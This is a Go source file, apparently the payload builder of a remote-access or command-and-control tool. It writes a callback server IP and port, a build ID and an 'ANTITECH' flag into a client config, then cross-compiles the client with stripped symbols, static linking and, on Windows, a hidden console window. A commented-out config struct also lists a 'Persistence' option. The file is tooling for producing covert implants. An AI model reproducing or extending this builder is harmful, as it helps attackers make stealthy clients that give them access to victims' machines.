package builder

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"server/common"
	"strings"
	"time"
)

/*type BuildConfig struct {
	OS         string // linux, windows, darwin
	Arch       string // amd64, arm64, 386
	Output     string // output filename
	ServerIP   string // server IP address
	ServerPort string // server port
	BuildID    string // unique build ID
}*/

/*type BuildConfig struct {
	OS           string
	Arch         string
	IP           string
	ServerDomain string
	Port         string
	Persistence  bool
}*/

type CertBundle struct {
	CACert     []byte
	CAKey      []byte
	ServerCert []byte
	ServerKey  []byte
}

type ClientCertBundle struct {
	ClientCert []byte
	ClientKey  []byte
	CACert     []byte
}

func Build(config common.BuildConfig) (string, error) {
	cmd := exec.Command("go", "clean", "-cache")
	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("cache cleanup failed: %v", err)
	}

	buildID := generateBuildID()

	/*
		clientCertBundle, err := createClientCertBundle()
		if err != nil {
			return "", fmt.Errorf("client certificate bundle creation failed: %v", err)
		}

		if err := createClientConfig1(buildID, config, clientCertBundle); err != nil {
			return "", fmt.Errorf("client config error: %v", err)
		}*/

	if err := UpdateClientConfig(buildID, config.IP, config.Port, config.ANTITECH); err != nil {
		return "", fmt.Errorf("client config update error: %v", err)
	}

	if err := BuildClient(buildID, config); err != nil {
		return "", fmt.Errorf("build error: %v", err)
	}

	return buildID, nil
}

func BuildClient(ID string, config common.BuildConfig) error {
	buildID := ID
	outputName := buildID

	if outputName == "" {
		randomString, err := generateRandomString(5)
		if err != nil {
			outputName = "client"
		} else {
			outputName = "client_" + randomString
		}
	}

	if config.OS == "windows" {
		outputName += ".exe"
	}

	buildDir := "../client"
	outputDir := "../cmd/output"

	fullOutputDir := filepath.Join(buildDir, outputDir)
	if _, err := os.Stat(fullOutputDir); os.IsNotExist(err) {
		if err := os.MkdirAll(fullOutputDir, 0755); err != nil {
			fmt.Printf("output directory creation error: %v\n", err)
			return err
		}
	}

	// Only security-focused compilation flags
	ldflags := []string{
		"-s", // Remove symbol table
		"-w", // Remove DWARF symbol table
	}

	// Hide console window on Windows
	if config.OS == "windows" {
		ldflags = append(ldflags, "-H=windowsgui")
	}

	// Optional optimization flags
	if config.OS != "darwin" { // macOS can cause problems
		ldflags = append(ldflags, "-extldflags '-static'") // Static linking
	}

	// Join all ldflags
	ldflagsStr := strings.Join(ldflags, " ")

	// Build command
	cmd := exec.Command("go", "build",
		"-trimpath", // Remove path information
		"-ldflags", ldflagsStr,
		"-o", filepath.Join(fullOutputDir, outputName))

	cmd.Dir = buildDir
	cmd.Env = append(os.Environ(),
		fmt.Sprintf("GOOS=%s", config.OS),
		fmt.Sprintf("GOARCH=%s", config.Arch),
		"CGO_ENABLED=0", // Disable CGO (more portable binary)
	)

	// Get build output
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("build error: %v\nOutput: %s", err, output)
	}

	fmt.Printf("Client successfully built: %s\n", filepath.Join(fullOutputDir, outputName))
	return nil
}

func generateBuildID() string {
	timestamp := time.Now().UnixNano()
	random := make([]byte, 8)
	rand.Read(random)

	data := append([]byte(fmt.Sprintf("%d", timestamp)), random...)
	hash := sha256.Sum256(data)
	return hex.EncodeToString(hash[:8])
}

func generateRandomString(n int) (string, error) {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	bytes := make([]byte, n)
	_, err := rand.Read(bytes)
	if err != nil {
		return "", err
	}

	for i, b := range bytes {
		bytes[i] = letters[b%byte(len(letters))]
	}

	return string(bytes), nil
}

func UpdateClientConfig(buildID string, serverIP string, serverPort string, ANTITECH bool) error {
	fmt.Printf("Updating client config: BuildID=%s\n", buildID)

	// Determine config file path
	configPath := filepath.Join("..", "client", "config", "config.go")

	// Read the config file
	configData, err := os.ReadFile(configPath)
	if err != nil {
		return fmt.Errorf("config file reading error: %v", err)
	}

	// Convert the file content to a string
	configContent := string(configData)

	// Update BUILD_ID value
	buildIDPattern := `BUILD_ID\s*=\s*".*?"`
	buildIDReplacement := fmt.Sprintf(`BUILD_ID = "%s"`, buildID)
	buildIDRegex := regexp.MustCompile(buildIDPattern)
	configContent = buildIDRegex.ReplaceAllString(configContent, buildIDReplacement)

	// Update SERVER_IP value
	serverIPPattern := `SERVER_IP\s*=\s*".*?"`
	serverIPReplacement := fmt.Sprintf(`SERVER_IP = "%s"`, serverIP)
	serverIPRegex := regexp.MustCompile(serverIPPattern)
	configContent = serverIPRegex.ReplaceAllString(configContent, serverIPReplacement)

	// Update SERVER_PORT value
	serverPortPattern := `SERVER_PORT\s*=\s*".*?"`
	serverPortReplacement := fmt.Sprintf(`SERVER_PORT = "%s"`, serverPort)
	serverPortRegex := regexp.MustCompile(serverPortPattern)
	configContent = serverPortRegex.ReplaceAllString(configContent, serverPortReplacement)

	// Update ANTITECH value
	ANTITECHPattern := `ANTITECH\s*=\s*(true|false)`
	ANTITECHReplacement := fmt.Sprintf(`ANTITECH = %v`, ANTITECH)
	ANTITECHRegex := regexp.MustCompile(ANTITECHPattern)
	configContent = ANTITECHRegex.ReplaceAllString(configContent, ANTITECHReplacement)

	// Write File
	err = os.WriteFile(configPath, []byte(configContent), 0644)
	if err != nil {
		return fmt.Errorf("config file writing error: %v", err)
	}

	fmt.Println("Client config file successfully updated.")
	return nil
}
